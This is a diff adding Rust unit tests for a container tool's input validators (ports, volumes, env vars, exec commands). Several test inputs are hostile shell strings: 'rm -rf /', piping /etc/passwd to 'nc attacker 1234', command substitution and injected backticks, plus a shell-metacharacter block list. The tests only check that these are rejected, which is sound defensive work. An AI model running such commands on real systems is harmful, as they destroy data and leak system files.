@@ -2181,4 +2181,1207 @@ mod tests {
             );
         }
     }
+
+    // ====================================================================
+    // is_valid_port tests
+    // ====================================================================
+
+    #[test]
+    fn test_is_valid_port_basic_valid() {
+        assert!(is_valid_port("80"));
+        assert!(is_valid_port("8080"));
+        assert!(is_valid_port("443"));
+        assert!(is_valid_port("1"));
+        assert!(is_valid_port("65535"));
+    }
+
+    #[test]
+    fn test_is_valid_port_zero_rejected() {
+        assert!(!is_valid_port("0"));
+    }
+
+    #[test]
+    fn test_is_valid_port_empty_rejected() {
+        assert!(!is_valid_port(""));
+    }
+
+    #[test]
+    fn test_is_valid_port_non_numeric_rejected() {
+        assert!(!is_valid_port("abc"));
+        assert!(!is_valid_port("80abc"));
+        assert!(!is_valid_port("abc80"));
+    }
+
+    #[test]
+    fn test_is_valid_port_negative_rejected() {
+        assert!(!is_valid_port("-1"));
+        assert!(!is_valid_port("-80"));
+    }
+
+    #[test]
+    fn test_is_valid_port_overflow_rejected() {
+        assert!(!is_valid_port("65536"));
+        assert!(!is_valid_port("100000"));
+    }
+
+    #[test]
+    fn test_is_valid_port_whitespace_rejected() {
+        assert!(!is_valid_port(" 80"));
+        assert!(!is_valid_port("80 "));
+        assert!(!is_valid_port(" "));
+    }
+
+    // ====================================================================
+    // validate_port_mapping tests
+    // ====================================================================
+
+    #[test]
+    fn test_port_mapping_basic_valid() {
+        assert!(validate_port_mapping("8080:80"));
+        assert!(validate_port_mapping("3000:3000"));
+        assert!(validate_port_mapping("443:443"));
+    }
+
+    #[test]
+    fn test_port_mapping_with_tcp() {
+        assert!(validate_port_mapping("8080:80/tcp"));
+    }
+
+    #[test]
+    fn test_port_mapping_with_udp() {
+        assert!(validate_port_mapping("53:53/udp"));
+    }
+
+    #[test]
+    fn test_port_mapping_invalid_proto() {
+        assert!(!validate_port_mapping("8080:80/sctp"));
+        assert!(!validate_port_mapping("8080:80/http"));
+    }
+
+    #[test]
+    fn test_port_mapping_empty_proto() {
+        assert!(!validate_port_mapping("8080:80/"));
+    }
+
+    #[test]
+    fn test_port_mapping_proto_case_sensitive() {
+        assert!(!validate_port_mapping("8080:80/TCP"));
+        assert!(!validate_port_mapping("8080:80/UDP"));
+    }
+
+    #[test]
+    fn test_port_mapping_with_ipv4() {
+        assert!(validate_port_mapping("127.0.0.1:8080:80"));
+        assert!(validate_port_mapping("0.0.0.0:3000:3000"));
+    }
+
+    #[test]
+    fn test_port_mapping_ipv6_brackets_rejected() {
+        // [::1] contains extra colons so split(':') yields >3 parts
+        assert!(!validate_port_mapping("[::1]:8080:80"));
+    }
+
+    #[test]
+    fn test_port_mapping_single_port_rejected() {
+        assert!(!validate_port_mapping("8080"));
+    }
+
+    #[test]
+    fn test_port_mapping_too_many_colons_rejected() {
+        assert!(!validate_port_mapping("a:b:c:d"));
+    }
+
+    #[test]
+    fn test_port_mapping_zero_port_rejected() {
+        assert!(!validate_port_mapping("0:80"));
+        assert!(!validate_port_mapping("80:0"));
+    }
+
+    #[test]
+    fn test_port_mapping_non_numeric_port() {
+        assert!(!validate_port_mapping("abc:80"));
+        assert!(!validate_port_mapping("80:abc"));
+    }
+
+    #[test]
+    fn test_port_mapping_empty_host_port() {
+        assert!(!validate_port_mapping(":80"));
+    }
+
+    #[test]
+    fn test_port_mapping_empty_container_port() {
+        assert!(!validate_port_mapping("80:"));
+    }
+
+    #[test]
+    fn test_port_mapping_empty_string() {
+        assert!(!validate_port_mapping(""));
+    }
+
+    #[test]
+    fn test_port_mapping_shell_metachar_backtick() {
+        assert!(!validate_port_mapping("80`id`:80"));
+    }
+
+    #[test]
+    fn test_port_mapping_shell_metachar_dollar() {
+        assert!(!validate_port_mapping("$HOME:80"));
+    }
+
+    #[test]
+    fn test_port_mapping_shell_metachar_pipe() {
+        assert!(!validate_port_mapping("80|cat:80"));
+    }
+
+    #[test]
+    fn test_port_mapping_shell_metachar_semicolon() {
+        assert!(!validate_port_mapping("80;echo:80"));
+    }
+
+    #[test]
+    fn test_port_mapping_shell_metachar_ampersand() {
+        assert!(!validate_port_mapping("80&:80"));
+    }
+
+    #[test]
+    fn test_port_mapping_shell_metachar_newline() {
+        assert!(!validate_port_mapping("80\n:80"));
+    }
+
+    #[test]
+    fn test_port_mapping_shell_metachar_null() {
+        assert!(!validate_port_mapping("80\0:80"));
+    }
+
+    #[test]
+    fn test_port_mapping_empty_ip_three_parts() {
+        assert!(!validate_port_mapping(":8080:80"));
+    }
+
+    #[test]
+    fn test_port_mapping_three_parts_invalid_ports() {
+        assert!(!validate_port_mapping("127.0.0.1:0:80"));
+        assert!(!validate_port_mapping("127.0.0.1:80:0"));
+        assert!(!validate_port_mapping("127.0.0.1:abc:80"));
+        assert!(!validate_port_mapping("127.0.0.1:80:abc"));
+    }
+
+    #[test]
+    fn test_port_mapping_with_ip_and_proto() {
+        assert!(validate_port_mapping("127.0.0.1:8080:80/tcp"));
+        assert!(validate_port_mapping("0.0.0.0:53:53/udp"));
+    }
+
+    #[test]
+    fn test_port_mapping_boundary_port_1() {
+        assert!(validate_port_mapping("1:1"));
+    }
+
+    #[test]
+    fn test_port_mapping_boundary_port_65535() {
+        assert!(validate_port_mapping("65535:65535"));
+    }
+
+    #[test]
+    fn test_port_mapping_boundary_port_65536() {
+        assert!(!validate_port_mapping("65536:80"));
+        assert!(!validate_port_mapping("80:65536"));
+    }
+
+    #[test]
+    fn test_port_mapping_each_shell_metachar_rejected() {
+        for &ch in SHELL_METACHARACTERS {
+            let mapping = format!("80{}0:80", ch);
+            assert!(
+                !validate_port_mapping(&mapping),
+                "Port mapping should reject metachar {:?}",
+                ch
+            );
+        }
+    }
+
+    // ====================================================================
+    // validate_volume_spec tests
+    // ====================================================================
+
+    #[test]
+    fn test_volume_spec_basic_valid() {
+        assert!(validate_volume_spec("./data:/data"));
+        assert!(validate_volume_spec("/host/path:/container/path"));
+    }
+
+    #[test]
+    fn test_volume_spec_with_ro() {
+        assert!(validate_volume_spec("/host:/container:ro"));
+    }
+
+    #[test]
+    fn test_volume_spec_with_rw() {
+        assert!(validate_volume_spec("/host:/container:rw"));
+    }
+
+    #[test]
+    fn test_volume_spec_with_selinux_z() {
+        assert!(validate_volume_spec("/host:/container:z"));
+    }
+
+    #[test]
+    fn test_volume_spec_with_selinux_cap_z() {
+        assert!(validate_volume_spec("/host:/container:Z"));
+    }
+
+    #[test]
+    fn test_volume_spec_with_ro_z() {
+        assert!(validate_volume_spec("/host:/container:ro,z"));
+    }
+
+    #[test]
+    fn test_volume_spec_with_rw_z() {
+        assert!(validate_volume_spec("/host:/container:rw,z"));
+    }
+
+    #[test]
+    fn test_volume_spec_with_ro_cap_z() {
+        assert!(validate_volume_spec("/host:/container:ro,Z"));
+    }
+
+    #[test]
+    fn test_volume_spec_with_rw_cap_z() {
+        assert!(validate_volume_spec("/host:/container:rw,Z"));
+    }
+
+    #[test]
+    fn test_volume_spec_invalid_option() {
+        assert!(!validate_volume_spec("/host:/container:invalid"));
+        assert!(!validate_volume_spec("/host:/container:exec"));
+        assert!(!validate_volume_spec("/host:/container:noexec"));
+    }
+
+    #[test]
+    fn test_volume_spec_empty_host() {
+        assert!(!validate_volume_spec(":/container"));
+    }
+
+    #[test]
+    fn test_volume_spec_empty_container() {
+        assert!(!validate_volume_spec("/host:"));
+    }
+
+    #[test]
+    fn test_volume_spec_container_not_absolute() {
+        assert!(!validate_volume_spec("/host:relative"));
+        assert!(!validate_volume_spec("/host:container"));
+    }
+
+    #[test]
+    fn test_volume_spec_single_part() {
+        assert!(!validate_volume_spec("/just/a/path"));
+    }
+
+    #[test]
+    fn test_volume_spec_empty_string() {
+        assert!(!validate_volume_spec(""));
+    }
+
+    #[test]
+    fn test_volume_spec_shell_metachar_backtick() {
+        assert!(!validate_volume_spec("/host`id`:/container"));
+    }
+
+    #[test]
+    fn test_volume_spec_shell_metachar_dollar() {
+        assert!(!validate_volume_spec("$HOME:/container"));
+    }
+
+    #[test]
+    fn test_volume_spec_shell_metachar_semicolon() {
+        assert!(!validate_volume_spec("/host;echo:/container"));
+    }
+
+    #[test]
+    fn test_volume_spec_shell_metachar_pipe() {
+        assert!(!validate_volume_spec("/host|cat:/container"));
+    }
+
+    #[test]
+    fn test_volume_spec_shell_metachar_null() {
+        assert!(!validate_volume_spec("/host\0:/container"));
+    }
+
+    #[test]
+    fn test_volume_spec_shell_metachar_newline() {
+        assert!(!validate_volume_spec("/host\n:/container"));
+    }
+
+    #[test]
+    fn test_volume_spec_three_parts_empty_host() {
+        assert!(!validate_volume_spec(":/container:ro"));
+    }
+
+    #[test]
+    fn test_volume_spec_three_parts_empty_container() {
+        assert!(!validate_volume_spec("/host::ro"));
+    }
+
+    #[test]
+    fn test_volume_spec_three_parts_container_not_absolute() {
+        assert!(!validate_volume_spec("/host:relative:ro"));
+    }
+
+    #[test]
+    fn test_volume_spec_named_volume() {
+        assert!(validate_volume_spec("myvolume:/data"));
+    }
+
+    #[test]
+    fn test_volume_spec_named_volume_with_option() {
+        assert!(validate_volume_spec("myvolume:/data:ro"));
+    }
+
+    #[test]
+    fn test_volume_spec_each_shell_metachar_rejected() {
+        for &ch in SHELL_METACHARACTERS {
+            let spec = format!("/host{}path:/container", ch);
+            assert!(
+                !validate_volume_spec(&spec),
+                "Volume spec should reject metachar {:?}",
+                ch
+            );
+        }
+    }
+
+    // ====================================================================
+    // SHELL_METACHARACTERS constant tests
+    // ====================================================================
+
+    #[test]
+    fn test_shell_metacharacters_contains_all_expected() {
+        assert!(SHELL_METACHARACTERS.contains(&'`'));
+        assert!(SHELL_METACHARACTERS.contains(&'$'));
+        assert!(SHELL_METACHARACTERS.contains(&'('));
+        assert!(SHELL_METACHARACTERS.contains(&')'));
+        assert!(SHELL_METACHARACTERS.contains(&'|'));
+        assert!(SHELL_METACHARACTERS.contains(&';'));
+        assert!(SHELL_METACHARACTERS.contains(&'&'));
+        assert!(SHELL_METACHARACTERS.contains(&'!'));
+        assert!(SHELL_METACHARACTERS.contains(&'<'));
+        assert!(SHELL_METACHARACTERS.contains(&'>'));
+        assert!(SHELL_METACHARACTERS.contains(&'\n'));
+        assert!(SHELL_METACHARACTERS.contains(&'\r'));
+        assert!(SHELL_METACHARACTERS.contains(&'\0'));
+    }
+
+    #[test]
+    fn test_shell_metacharacters_count() {
+        assert_eq!(SHELL_METACHARACTERS.len(), 13);
+    }
+
+    // ====================================================================
+    // ContainerRun::execute validation paths
+    // ====================================================================
+
+    #[tokio::test]
+    async fn test_container_run_invalid_port_mapping() {
+        let tool = ContainerRun;
+        let result = tool
+            .execute(json!({
+                "image": "nginx",
+                "ports": ["invalid"],
+                "runtime": "docker"
+            }))
+            .await;
+        assert!(result.is_err());
+        let err = result.unwrap_err().to_string();
+        assert!(err.contains("Invalid port mapping"));
+    }
+
+    #[tokio::test]
+    async fn test_container_run_invalid_port_zero() {
+        let tool = ContainerRun;
+        let result = tool
+            .execute(json!({
+                "image": "nginx",
+                "ports": ["0:80"],
+                "runtime": "docker"
+            }))
+            .await;
+        assert!(result.is_err());
+        assert!(result
+            .unwrap_err()
+            .to_string()
+            .contains("Invalid port mapping"));
+    }
+
+    #[tokio::test]
+    async fn test_container_run_invalid_port_shell_injection() {
+        let tool = ContainerRun;
+        let result = tool
+            .execute(json!({
+                "image": "nginx",
+                "ports": ["80`id`:80"],
+                "runtime": "docker"
+            }))
+            .await;
+        assert!(result.is_err());
+        assert!(result
+            .unwrap_err()
+            .to_string()
+            .contains("Invalid port mapping"));
+    }
+
+    #[tokio::test]
+    async fn test_container_run_invalid_volume_spec() {
+        let tool = ContainerRun;
+        let result = tool
+            .execute(json!({
+                "image": "nginx",
+                "volumes": ["/only/one/path"],
+                "runtime": "docker"
+            }))
+            .await;
+        assert!(result.is_err());
+        let err = result.unwrap_err().to_string();
+        assert!(err.contains("Invalid volume spec"));
+    }
+
+    #[tokio::test]
+    async fn test_container_run_volume_not_absolute() {
+        let tool = ContainerRun;
+        let result = tool
+            .execute(json!({
+                "image": "nginx",
+                "volumes": ["/host:relative"],
+                "runtime": "docker"
+            }))
+            .await;
+        assert!(result.is_err());
+        assert!(result
+            .unwrap_err()
+            .to_string()
+            .contains("Invalid volume spec"));
+    }
+
+    #[tokio::test]
+    async fn test_container_run_volume_shell_injection() {
+        let tool = ContainerRun;
+        let result = tool
+            .execute(json!({
+                "image": "nginx",
+                "volumes": ["$HOME:/container"],
+                "runtime": "docker"
+            }))
+            .await;
+        assert!(result.is_err());
+        assert!(result
+            .unwrap_err()
+            .to_string()
+            .contains("Invalid volume spec"));
+    }
+
+    #[tokio::test]
+    async fn test_container_run_invalid_env_name_empty() {
+        let tool = ContainerRun;
+        let result = tool
+            .execute(json!({
+                "image": "nginx",
+                "env": {"": "value"},
+                "runtime": "docker"
+            }))
+            .await;
+        assert!(result.is_err());
+        assert!(result
+            .unwrap_err()
+            .to_string()
+            .contains("Invalid env var name"));
+    }
+
+    #[tokio::test]
+    async fn test_container_run_invalid_env_name_special_chars() {
+        let tool = ContainerRun;
+        let result = tool
+            .execute(json!({
+                "image": "nginx",
+                "env": {"MY-VAR": "value"},
+                "runtime": "docker"
+            }))
+            .await;
+        assert!(result.is_err());
+        assert!(result
+            .unwrap_err()
+            .to_string()
+            .contains("Invalid env var name"));
+    }
+
+    #[tokio::test]
+    async fn test_container_run_invalid_env_name_dots() {
+        let tool = ContainerRun;
+        let result = tool
+            .execute(json!({
+                "image": "nginx",
+                "env": {"MY.VAR": "value"},
+                "runtime": "docker"
+            }))
+            .await;
+        assert!(result.is_err());
+        assert!(result
+            .unwrap_err()
+            .to_string()
+            .contains("Invalid env var name"));
+    }
+
+    #[tokio::test]
+    async fn test_container_run_env_null_byte_in_value() {
+        let tool = ContainerRun;
+        let result = tool
+            .execute(json!({
+                "image": "nginx",
+                "env": {"MY_VAR": "value\u{0000}bad"},
+                "runtime": "docker"
+            }))
+            .await;
+        assert!(result.is_err());
+        assert!(result.unwrap_err().to_string().contains("null bytes"));
+    }
+
+    #[tokio::test]
+    async fn test_container_run_env_name_with_space() {
+        let tool = ContainerRun;
+        let result = tool
+            .execute(json!({
+                "image": "nginx",
+                "env": {"MY VAR": "value"},
+                "runtime": "docker"
+            }))
+            .await;
+        assert!(result.is_err());
+        assert!(result
+            .unwrap_err()
+            .to_string()
+            .contains("Invalid env var name"));
+    }
+
+    #[tokio::test]
+    async fn test_container_run_env_name_valid_underscore() {
+        // Valid env var name with underscores -- should not error on validation
+        // (may error on Docker command not found, but not on validation)
+        let tool = ContainerRun;
+        let result = tool
+            .execute(json!({
+                "image": "nginx",
+                "env": {"MY_VAR_123": "value"},
+                "runtime": "docker"
+            }))
+            .await;
+        match result {
+            Err(e) => {
+                assert!(
+                    !e.to_string().contains("Invalid env var name"),
+                    "Valid env var name should not be rejected: {}",
+                    e
+                );
+            }
+            Ok(_) => {}
+        }
+    }
+
+    #[tokio::test]
+    async fn test_container_run_env_value_non_string_ignored() {
+        // Non-string env values should be silently skipped (no error)
+        let tool = ContainerRun;
+        let result = tool
+            .execute(json!({
+                "image": "nginx",
+                "env": {"NUMERIC": 42},
+                "runtime": "docker"
+            }))
+            .await;
+        match result {
+            Err(e) => {
+                assert!(
+                    !e.to_string().contains("Invalid env var name"),
+                    "Non-string env values should be skipped: {}",
+                    e
+                );
+                assert!(
+                    !e.to_string().contains("null bytes"),
+                    "Non-string env values should be skipped: {}",
+                    e
+                );
+            }
+            Ok(_) => {}
+        }
+    }
+
+    // ====================================================================
+    // ContainerExec::execute forbidden metacharacter tests
+    // ====================================================================
+
+    #[tokio::test]
+    async fn test_container_exec_forbidden_semicolon() {
+        let tool = ContainerExec;
+        let result = tool
+            .execute(json!({
+                "container": "test",
+                "command": ["ls; rm -rf /"],
+                "runtime": "docker"
+            }))
+            .await;
+        assert!(result.is_err());
+        assert!(result
+            .unwrap_err()
+            .to_string()
+            .contains("forbidden metacharacter"));
+    }
+
+    #[tokio::test]
+    async fn test_container_exec_forbidden_pipe() {
+        let tool = ContainerExec;
+        let result = tool
+            .execute(json!({
+                "container": "test",
+                "command": ["cat /etc/passwd | nc attacker 1234"],
+                "runtime": "docker"
+            }))
+            .await;
+        assert!(result.is_err());
+        assert!(result
+            .unwrap_err()
+            .to_string()
+            .contains("forbidden metacharacter"));
+    }
+
+    #[tokio::test]
+    async fn test_container_exec_forbidden_ampersand() {
+        let tool = ContainerExec;
+        let result = tool
+            .execute(json!({
+                "container": "test",
+                "command": ["sleep 999 &"],
+                "runtime": "docker"
+            }))
+            .await;
+        assert!(result.is_err());
+        assert!(result
+            .unwrap_err()
+            .to_string()
+            .contains("forbidden metacharacter"));
+    }
+
+    #[tokio::test]
+    async fn test_container_exec_forbidden_backtick() {
+        let tool = ContainerExec;
+        let result = tool
+            .execute(json!({
+                "container": "test",
+                "command": ["`whoami`"],
+                "runtime": "docker"
+            }))
+            .await;
+        assert!(result.is_err());
+        assert!(result
+            .unwrap_err()
+            .to_string()
+            .contains("forbidden metacharacter"));
+    }
+
+    #[tokio::test]
+    async fn test_container_exec_forbidden_dollar() {
+        let tool = ContainerExec;
+        let result = tool
+            .execute(json!({
+                "container": "test",
+                "command": ["echo $SECRET"],
+                "runtime": "docker"
+            }))
+            .await;
+        assert!(result.is_err());
+        assert!(result
+            .unwrap_err()
+            .to_string()
+            .contains("forbidden metacharacter"));
+    }
+
+    #[tokio::test]
+    async fn test_container_exec_forbidden_parens() {
+        let tool = ContainerExec;
+        let result = tool
+            .execute(json!({
+                "container": "test",
+                "command": ["$(rm -rf /)"],
+                "runtime": "docker"
+            }))
+            .await;
+        assert!(result.is_err());
+        assert!(result
+            .unwrap_err()
+            .to_string()
+            .contains("forbidden metacharacter"));
+    }
+
+    #[tokio::test]
+    async fn test_container_exec_forbidden_redirect() {
+        let tool = ContainerExec;
+        let result = tool
+            .execute(json!({
+                "container": "test",
+                "command": ["echo hi > /etc/passwd"],
+                "runtime": "docker"
+            }))
+            .await;
+        assert!(result.is_err());
+        assert!(result
+            .unwrap_err()
+            .to_string()
+            .contains("forbidden metacharacter"));
+    }
+
+    #[tokio::test]
+    async fn test_container_exec_forbidden_in_second_arg() {
+        let tool = ContainerExec;
+        let result = tool
+            .execute(json!({
+                "container": "test",
+                "command": ["echo", "safe; danger"],
+                "runtime": "docker"
+            }))
+            .await;
+        assert!(result.is_err());
+        assert!(result
+            .unwrap_err()
+            .to_string()
+            .contains("forbidden metacharacter"));
+    }
+
+    #[tokio::test]
+    async fn test_container_exec_safe_command_passes_validation() {
+        let tool = ContainerExec;
+        let result = tool
+            .execute(json!({
+                "container": "test",
+                "command": ["ls", "-la", "/tmp"],
+                "runtime": "docker"
+            }))
+            .await;
+        // Should not fail with forbidden metacharacter error
+        match result {
+            Err(e) => {
+                assert!(
+                    !e.to_string().contains("forbidden metacharacter"),
+                    "Safe command should not be blocked: {}",
+                    e
+                );
+            }
+            Ok(_) => {}
+        }
+    }
+
+    // ====================================================================
+    // get_runtime tests
+    // ====================================================================
+
+    #[tokio::test]
+    async fn test_get_runtime_auto_detection() {
+        let result = get_runtime(None).await;
+        match result {
+            Ok(rt) => {
+                assert!(rt == ContainerRuntime::Docker || rt == ContainerRuntime::Podman);
+            }
+            Err(e) => {
+                assert!(e.to_string().contains("No container runtime found"));
+            }
+        }
+    }
+
+    #[tokio::test]
+    async fn test_get_runtime_unknown_string_falls_to_auto() {
+        let result = get_runtime(Some("unknown")).await;
+        match result {
+            Ok(rt) => {
+                assert!(rt == ContainerRuntime::Docker || rt == ContainerRuntime::Podman);
+            }
+            Err(e) => {
+                assert!(e.to_string().contains("No container runtime found"));
+            }
+        }
+    }
+
+    #[tokio::test]
+    async fn test_get_runtime_auto_string_falls_to_detect() {
+        let result = get_runtime(Some("auto")).await;
+        match result {
+            Ok(rt) => {
+                assert!(rt == ContainerRuntime::Docker || rt == ContainerRuntime::Podman);
+            }
+            Err(e) => {
+                assert!(e.to_string().contains("No container runtime found"));
+            }
+        }
+    }
+
+    // ====================================================================
+    // Additional parse_build_output edge cases
+    // ====================================================================
+
+    #[test]
+    fn test_parse_build_output_successfully_built_trailing_space() {
+        let stdout = "Successfully built ";
+        let result = parse_build_output(stdout, "");
+        assert_eq!(result, Some("built".to_string()));
+    }
+
+    #[test]
+    fn test_parse_build_output_sha256_in_stdout() {
+        let stdout = "writing image sha256:deadbeef1234 0.0s done";
+        let result = parse_build_output(stdout, "");
+        assert_eq!(result, Some("deadbeef1234".to_string()));
+    }
+
+    #[test]
+    fn test_parse_build_output_prefers_successfully_built() {
+        let stdout = "Successfully built myimage123\nwriting image sha256:otherhash";
+        let result = parse_build_output(stdout, "");
+        assert_eq!(result, Some("myimage123".to_string()));
+    }
+
+    #[test]
+    fn test_parse_build_output_sha256_no_whitespace_after() {
+        let stderr = "writing image sha256:onlyid";
+        let result = parse_build_output("", stderr);
+        assert_eq!(result, Some("onlyid".to_string()));
+    }
+
+    // ====================================================================
+    // Additional truncate_output edge cases
+    // ====================================================================
+
+    #[test]
+    fn test_truncate_output_max_zero() {
+        let result = truncate_output("abc", 0);
+        assert!(result.contains("truncated"));
+        assert!(result.contains("3 total chars"));
+    }
+
+    #[test]
+    fn test_truncate_output_max_one() {
+        let result = truncate_output("ab", 1);
+        assert!(result.starts_with('a'));
+        assert!(result.contains("truncated"));
+    }
+
+    #[test]
+    fn test_truncate_output_preserves_content_up_to_max() {
+        let result = truncate_output("abcdefghij", 5);
+        assert!(result.starts_with("abcde"));
+        assert!(result.contains("10 total chars"));
+    }
+
+    // ====================================================================
+    // ContainerInfo / ImageInfo roundtrip serde tests
+    // ====================================================================
+
+    #[test]
+    fn test_container_info_serde_roundtrip() {
+        let info = ContainerInfo {
+            id: "abc123".to_string(),
+            image: "nginx:latest".to_string(),
+            command: "nginx -g daemon off".to_string(),
+            created: "2025-06-01 12:00:00".to_string(),
+            status: "Up 3 hours".to_string(),
+            ports: "0.0.0.0:80->80/tcp".to_string(),
+            names: "web-server".to_string(),
+        };
+        let serialized = serde_json::to_string(&info).unwrap();
+        let deserialized: ContainerInfo = serde_json::from_str(&serialized).unwrap();
+        assert_eq!(deserialized.id, info.id);
+        assert_eq!(deserialized.image, info.image);
+        assert_eq!(deserialized.command, info.command);
+        assert_eq!(deserialized.created, info.created);
+        assert_eq!(deserialized.status, info.status);
+        assert_eq!(deserialized.ports, info.ports);
+        assert_eq!(deserialized.names, info.names);
+    }
+
+    #[test]
+    fn test_image_info_serde_roundtrip() {
+        let info = ImageInfo {
+            id: "sha256:deadbeef".to_string(),
+            repository: "myregistry.io/myapp".to_string(),
+            tag: "v3.2.1".to_string(),
+            created: "2 weeks ago".to_string(),
+            size: "512MB".to_string(),
+        };
+        let serialized = serde_json::to_string(&info).unwrap();
+        let deserialized: ImageInfo = serde_json::from_str(&serialized).unwrap();
+        assert_eq!(deserialized.id, info.id);
+        assert_eq!(deserialized.repository, info.repository);
+        assert_eq!(deserialized.tag, info.tag);
+        assert_eq!(deserialized.created, info.created);
+        assert_eq!(deserialized.size, info.size);
+    }
+
+    // ====================================================================
+    // Schema property type validation
+    // ====================================================================
+
+    #[test]
+    fn test_container_run_schema_property_types() {
+        let schema = ContainerRun.schema();
+        let props = &schema["properties"];
+        assert_eq!(props["image"]["type"], "string");
+        assert_eq!(props["name"]["type"], "string");
+        assert_eq!(props["command"]["type"], "array");
+        assert_eq!(props["ports"]["type"], "array");
+        assert_eq!(props["volumes"]["type"], "array");
+        assert_eq!(props["env"]["type"], "object");
+        assert_eq!(props["detach"]["type"], "boolean");
+        assert_eq!(props["rm"]["type"], "boolean");
+        assert_eq!(props["network"]["type"], "string");
+        assert_eq!(props["workdir"]["type"], "string");
+        assert_eq!(props["runtime"]["type"], "string");
+    }
+
+    #[test]
+    fn test_container_run_schema_runtime_enum() {
+        let schema = ContainerRun.schema();
+        let runtime_enum = schema["properties"]["runtime"]["enum"].as_array().unwrap();
+        assert!(runtime_enum.contains(&json!("docker")));
+        assert!(runtime_enum.contains(&json!("podman")));
+        assert!(runtime_enum.contains(&json!("auto")));
+    }
+
+    #[test]
+    fn test_container_stop_schema_property_types() {
+        let schema = ContainerStop.schema();
+        let props = &schema["properties"];
+        assert_eq!(props["container"]["type"], "string");
+        assert_eq!(props["timeout"]["type"], "integer");
+        assert_eq!(props["runtime"]["type"], "string");
+    }
+
+    #[test]
+    fn test_container_list_schema_property_types() {
+        let schema = ContainerList.schema();
+        let props = &schema["properties"];
+        assert_eq!(props["all"]["type"], "boolean");
+        assert_eq!(props["filter"]["type"], "string");
+        assert_eq!(props["runtime"]["type"], "string");
+    }
+
+    #[test]
+    fn test_container_logs_schema_property_types() {
+        let schema = ContainerLogs.schema();
+        let props = &schema["properties"];
+        assert_eq!(props["container"]["type"], "string");
+        assert_eq!(props["tail"]["type"], "integer");
+        assert_eq!(props["since"]["type"], "string");
+        assert_eq!(props["timestamps"]["type"], "boolean");
+        assert_eq!(props["runtime"]["type"], "string");
+    }
+
+    #[test]
+    fn test_container_exec_schema_property_types() {
+        let schema = ContainerExec.schema();
+        let props = &schema["properties"];
+        assert_eq!(props["container"]["type"], "string");
+        assert_eq!(props["command"]["type"], "array");
+        assert_eq!(props["workdir"]["type"], "string");
+        assert_eq!(props["env"]["type"], "object");
+        assert_eq!(props["user"]["type"], "string");
+        assert_eq!(props["runtime"]["type"], "string");
+    }
+
+    #[test]
+    fn test_container_build_schema_property_types() {
+        let schema = ContainerBuild.schema();
+        let props = &schema["properties"];
+        assert_eq!(props["tag"]["type"], "string");
+        assert_eq!(props["path"]["type"], "string");
+        assert_eq!(props["dockerfile"]["type"], "string");
+        assert_eq!(props["build_args"]["type"], "object");
+        assert_eq!(props["no_cache"]["type"], "boolean");
+        assert_eq!(props["target"]["type"], "string");
+        assert_eq!(props["runtime"]["type"], "string");
+    }
+
+    #[test]
+    fn test_container_images_schema_property_types() {
+        let schema = ContainerImages.schema();
+        let props = &schema["properties"];
+        assert_eq!(props["filter"]["type"], "string");
+        assert_eq!(props["all"]["type"], "boolean");
+        assert_eq!(props["runtime"]["type"], "string");
+    }
+
+    #[test]
+    fn test_container_pull_schema_property_types() {
+        let schema = ContainerPull.schema();
+        let props = &schema["properties"];
+        assert_eq!(props["image"]["type"], "string");
+        assert_eq!(props["runtime"]["type"], "string");
+    }
+
+    #[test]
+    fn test_container_remove_schema_property_types() {
+        let schema = ContainerRemove.schema();
+        let props = &schema["properties"];
+        assert_eq!(props["container"]["type"], "string");
+        assert_eq!(props["force"]["type"], "boolean");
+        assert_eq!(props["volumes"]["type"], "boolean");
+        assert_eq!(props["runtime"]["type"], "string");
+    }
+
+    #[test]
+    fn test_compose_up_schema_property_types() {
+        let schema = ComposeUp.schema();
+        let props = &schema["properties"];
+        assert_eq!(props["path"]["type"], "string");
+        assert_eq!(props["file"]["type"], "string");
+        assert_eq!(props["services"]["type"], "array");
+        assert_eq!(props["detach"]["type"], "boolean");
+        assert_eq!(props["build"]["type"], "boolean");
+        assert_eq!(props["runtime"]["type"], "string");
+    }
+
+    #[test]
+    fn test_compose_down_schema_property_types() {
+        let schema = ComposeDown.schema();
+        let props = &schema["properties"];
+        assert_eq!(props["path"]["type"], "string");
+        assert_eq!(props["file"]["type"], "string");
+        assert_eq!(props["volumes"]["type"], "boolean");
+        assert_eq!(props["rmi"]["type"], "string");
+        assert_eq!(props["runtime"]["type"], "string");
+    }
+
+    // ====================================================================
+    // Schemas with no required field
+    // ====================================================================
+
+    #[test]
+    fn test_container_list_schema_no_required() {
+        let schema = ContainerList.schema();
+        assert!(schema.get("required").is_none());
+    }
+
+    #[test]
+    fn test_container_images_schema_no_required() {
+        let schema = ContainerImages.schema();
+        assert!(schema.get("required").is_none());
+    }
+
+    #[test]
+    fn test_compose_up_schema_no_required() {
+        let schema = ComposeUp.schema();
+        assert!(schema.get("required").is_none());
+    }
+
+    #[test]
+    fn test_compose_down_schema_no_required() {
+        let schema = ComposeDown.schema();
+        assert!(schema.get("required").is_none());
+    }
+
+    // ====================================================================
+    // Multiple port/volume validation in ContainerRun
+    // ====================================================================
+
+    #[tokio::test]
+    async fn test_container_run_multiple_ports_second_invalid() {
+        let tool = ContainerRun;
+        let result = tool
+            .execute(json!({
+                "image": "nginx",
+                "ports": ["8080:80", "invalid"],
+                "runtime": "docker"
+            }))
+            .await;
+        assert!(result.is_err());
+        assert!(result
+            .unwrap_err()
+            .to_string()
+            .contains("Invalid port mapping"));
+    }
+
+    #[tokio::test]
+    async fn test_container_run_multiple_volumes_second_invalid() {
+        let tool = ContainerRun;
+        let result = tool
+            .execute(json!({
+                "image": "nginx",
+                "volumes": ["./data:/data", "nocolon"],
+                "runtime": "docker"
+            }))
+            .await;
+        assert!(result.is_err());
+        assert!(result
+            .unwrap_err()
+            .to_string()
+            .contains("Invalid volume spec"));
+    }
+
+    // ====================================================================
+    // Non-string items in ports/volumes/command arrays are skipped
+    // ====================================================================
+
+    #[tokio::test]
+    async fn test_container_run_non_string_port_skipped() {
+        let tool = ContainerRun;
+        let result = tool
+            .execute(json!({
+                "image": "nginx",
+                "ports": [8080],
+                "runtime": "docker"
+            }))
+            .await;
+        match result {
+            Err(e) => {
+                assert!(
+                    !e.to_string().contains("Invalid port mapping"),
+                    "Non-string port should be skipped: {}",
+                    e
+                );
+            }
+            Ok(_) => {}
+        }
+    }
+
+    #[tokio::test]
+    async fn test_container_run_non_string_volume_skipped() {
+        let tool = ContainerRun;
+        let result = tool
+            .execute(json!({
+                "image": "nginx",
+                "volumes": [123],
+                "runtime": "docker"
+            }))
+            .await;
+        match result {
+            Err(e) => {
+                assert!(
+                    !e.to_string().contains("Invalid volume spec"),
+                    "Non-string volume should be skipped: {}",
+                    e
+                );
+            }
+            Ok(_) => {}
